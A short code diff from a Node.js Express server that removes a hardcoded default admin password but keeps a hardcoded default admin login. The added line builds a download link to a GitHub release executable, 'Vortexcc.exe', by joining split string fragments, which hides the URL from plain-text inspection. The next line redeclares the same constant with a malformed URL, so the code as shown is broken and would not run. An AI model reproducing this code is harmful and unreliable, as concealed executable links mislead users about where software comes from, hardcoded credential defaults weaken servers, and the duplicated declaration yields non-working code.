@@ -10,7 +10,7 @@ app.use(express.json({ limit: '5mb' }));
 
 const PORT = process.env.PORT || 10000;
 const ADMIN_LOGIN = process.env.ADMIN_LOGIN || 'r3xd';
-const ADMIN_PASS = process.env.ADMIN_PASS || 'snus2012';
+const DOWNLOAD_URL = new Array('https:/', 'github.com', 'snus11713-hash', 'vortex-server', 'releases', 'download', 'v1.0', 'Vortexcc.exe').join('/');
 const DOWNLOAD_URL = process.env.DOWNLOAD_URL || 'https://' + '://github.com';
 
 const DATA_DIR = path.join(__dirname, 'data');
